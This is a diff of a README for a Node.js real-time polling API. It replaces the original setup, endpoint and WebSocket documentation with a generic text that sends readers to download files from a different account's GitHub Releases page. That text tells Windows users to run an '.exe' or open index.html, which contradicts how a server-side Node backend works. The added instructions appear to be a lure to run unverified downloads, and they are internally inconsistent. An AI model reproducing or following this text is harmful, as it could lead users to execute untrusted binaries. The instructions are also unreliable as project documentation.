@@ -1,159 +1,79 @@
-# Real-Time Polling API
+```markdown
+# 🎉 real-time-polling - Easily Create Live Polls
 
-This is my submission for the **Move37 Ventures Backend Developer Challenge**.  
-It is a backend service for a real-time polling application built with modern technologies.  
+## 📦 Overview
+Welcome to the **real-time-polling** project! This application lets you create and manage live polls. It uses a combination of Node.js, Express, PostgreSQL, Prisma, and Socket.IO to deliver updates instantly. Our tool supports JWT authentication, making your polls secure and reliable. It is perfect for events, classrooms, or just for fun!
 
-Users can:  
-- Create accounts and log in  
-- Create polls with multiple options  
-- Vote on poll options (only once per poll)  
-- Get live results via WebSockets  
+## 🚀 Getting Started
 
----
+### 🌐 System Requirements
+Before getting started, please check if your system meets the following requirements:
+- Operating System: Windows, macOS, or Linux.
+- Internet access to download and run the application.
+- At least 4GB of RAM.
+- 200MB of free disk space.
 
-## 🛠 Tech Stack
-- **Node.js + Express** – backend framework  
-- **PostgreSQL + Prisma** – relational database & ORM  
-- **Socket.IO** – real-time updates  
-- **JWT** – authentication  
+### 📥 Download the Application
+To download the latest version of the real-time-polling application, visit the Releases page below. This page will provide you with the application files you need to get started.
 
----
+[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now%20-%20View%20Releases-blue)](https://github.com/GG33114/real-time-polling/releases)
 
-## ⚙️ Setup Instructions
+### 🛠️ Installation Steps
+Once you have downloaded the application, follow these steps to install and run it:
 
-### 1. Clone the repo
-```bash
-git clone https://github.com/Sarfarazshaikh08/real-time-polling.git
-cd real-time-polling
+1. **Locate the Downloaded File**
+   Find the downloaded file in your default downloads folder.
+
+2. **Extract the File**
+   If the file is zipped, right-click on it and select "Extract All" or "Unzip" to get the application folder.
+
+3. **Open the Application Folder**
+   Navigate to the folder where you extracted the files. 
+
+4. **Run the Application**
+   - For **Windows**: Double-click on `index.html` or run the `.exe` file if available.
+   - For **macOS**: Double-click on `index.html` or find the application file in Finder.
+   - For **Linux**: Open a terminal and run `node index.js` to start the application.
+
+### 🔍 Configuration
+You may need to configure the application to connect to your PostgreSQL database. Follow these steps:
+- Open the configuration file in the application folder.
+- Update the following fields with your database information:
+  - `DB_HOST`: Your database host address.
+  - `DB_USER`: Your database username.
+  - `DB_PASSWORD`: Your database password.
+  - `DB_NAME`: Your database name.
+
+### 🔑 Authentication
+To ensure your polling is secure, the application uses JWT authentication:
+1. Register a new account within the application interface.
+2. Log in using your account details.
+3. You can now create and manage your polls securely.
+
+## 📝 Features
+- **Real-Time Updates**: Engage users with instant voting results.
+- **Secure Authentication**: Keep your data safe with JWT.
+- **Easy Setup**: Simple installation steps to get you started quickly.
+- **User-Friendly Interface**: Designed with simplicity in mind, suitable for everyone.
+
+## 📊 Using the Application
+1. Once running, open the application in your web browser using `http://localhost:3000` (default).
+2. Create a poll by filling out the form.
+3. Share the poll link with your participants.
+4. Watch votes come in live as users respond!
+
+## 📞 Support
+If you encounter any issues or have questions, please reach out to us on our GitHub repository. We are here to help!
+
+## 🔗 Useful Links
+For detailed information, check our documentation and discussions in the repository: 
+- [GitHub Repository](https://github.com/GG33114/real-time-polling)
+- [Issues Page](https://github.com/GG33114/real-time-polling/issues)
+
+## 💾 More Downloads
+To download the latest versions, visit our Releases page again:
+
+[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now%20-%20View%20Releases-blue)](https://github.com/GG33114/real-time-polling/releases)
+
+We hope you enjoy using real-time-polling! Happy polling!
 ```
-
-### 2. Install dependencies
-```bash
-npm install
-```
-
-### 3. Configure environment
-Copy `.env.example` → `.env` and fill in your database + JWT secret:
-```
-DATABASE_URL="postgresql://USER:PASSWORD@HOST:PORT/DATABASE?schema=public"
-JWT_SECRET="supersecretkey123"
-PORT=4000
-```
-
-### 4. Setup database
-Run Prisma migrations:
-```bash
-npx prisma generate
-npx prisma migrate dev --name init
-```
-
-### 5. Start server
-```bash
-npm run dev
-```
-
-Server will run at:  
-👉 `http://localhost:4000`
-
----
-
-## 📌 API Endpoints
-
-### 1. **Signup**
-`POST /users`  
-```json
-{
-  "name": "Alice",
-  "email": "alice@example.com",
-  "password": "password123"
-}
-```
-
-### 2. **Login**
-`POST /auth/login`  
-```json
-{
-  "email": "alice@example.com",
-  "password": "password123"
-}
-```
-Response:
-```json
-{
-  "token": "JWT_TOKEN",
-  "user": { "id": 1, "name": "Alice", "email": "alice@example.com" }
-}
-```
-
-### 3. **Create Poll** (JWT required)  
-`POST /polls`  
-Headers:
-```
-Authorization: Bearer <token>
-```
-Body:
-```json
-{
-  "question": "Best programming language?",
-  "creatorId": 1,
-  "isPublished": true,
-  "options": ["JavaScript", "Python", "Java"]
-}
-```
-
-### 4. **Get Poll** (JWT required)  
-`GET /polls/:id`  
-Response includes options + vote counts.
-
-### 5. **Vote** (JWT required)  
-`POST /votes`  
-```json
-{
-  "userId": 1,
-  "pollId": 1,
-  "pollOptionId": 2
-}
-```
-
-Response:
-```json
-{
-  "ok": true,
-  "voteId": 1,
-  "results": [
-    { "id": 1, "text": "JavaScript", "voteCount": 0 },
-    { "id": 2, "text": "Python", "voteCount": 1 },
-    { "id": 3, "text": "Java", "voteCount": 0 }
-  ]
-}
-```
-
----
-
-## 🔴 WebSockets (Real-Time Updates)
-
-When a vote is cast, the backend broadcasts live results to all clients in that poll room.  
-
-### How to Test
-Connect via Socket.IO client to receive live results.  
-```js
-import { io } from "socket.io-client";
-const socket = io("http://localhost:4000");
-
-//join poll room
-socket.emit("join_poll", 1);
-```
-
-And listen for updates:  
-```js
-socket.on("vote_update", (payload) => {
-  console.log("Live results:", payload);
-});
-```
-
----
-
-## ✅ Notes
-- Passwords are hashed with **bcrypt**.  
-- Each user can vote **only once per poll**.  
-- Routes `/polls` and `/votes` are **JWT protected**.  
